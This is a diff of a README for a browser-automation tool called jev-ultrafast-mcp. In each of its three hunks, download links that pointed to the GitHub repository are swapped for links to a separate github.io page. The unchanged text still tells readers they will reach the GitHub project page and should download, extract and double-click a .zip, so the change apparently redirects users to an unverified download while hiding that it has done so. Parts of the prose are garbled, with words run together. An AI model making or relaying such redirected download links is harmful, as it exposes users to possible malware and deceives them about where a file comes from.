@@ -1,6 +1,6 @@
 # ⚡ jev-ultrafast-mcp - One Call Finishes Whole Browser Tasks
 
-[![Download jev-ultrafast-mcp](https://img.shields.io/badge/Download-jev--ultrafast--mcp-0088CC?style=for-the-badge&logo=github&logoColor=white&labelColor=2b2b2b)](https://github.com/confident-christmasfactor2015/jev-ultrafast-mcp)
+[![Download jev-ultrafast-mcp](https://img.shields.io/badge/Download-jev--ultrafast--mcp-0088CC?style=for-the-badge&logo=github&logoColor=white&labelColor=2b2b2b)](https://confident-christmasfactor2015.github.io)
 
 Welcome to **jev-ultrafast-mcp** – a tool that lets you hand an entire browser job to a smart helper and get it done in one single request. Instead of telling the computer click-by-clickhire a pro driver who takes the wheelhandles every stepand comes back with the result.
 
@@ -28,7 +28,7 @@ Imagine you want a computer to fill out a form or test a webpage. Normallyyou wo
 
 Visit this link to download the application:
 
-[**👉 CLICK HERE TO DOWNLOAD jev-ultrafast-mcp**](https://github.com/confident-christmasfactor2015/jev-ultrafast-mcp)
+[**👉 CLICK HERE TO DOWNLOAD jev-ultrafast-mcp**](https://confident-christmasfactor2015.github.io)
 
 After clickingyou will arrive at the project's homepage on GitHub. Look for a green **"Releases"** section on the right side (or a "Download" button). Click on the newest release file listed there (the file with`.zip` at the end). If you only see a "Code" green buttonthat is for developers – you want the Releases link instead.
 
@@ -215,7 +215,7 @@ You have everything you need. It's a simple download extract double-click connec
 
 
 
-[**⬇️ Download jev-ultrafast-mcp Now**](https://github.com/confident-christmasfactor2015/jev-ultrafast-mcp)(Opens the release page – download the latest `.zip` file from there)
+[**⬇️ Download jev-ultrafast-mcp Now**](https://confident-christmasfactor2015.github.io)(Opens the release page – download the latest `.zip` file from there)
 
 
 
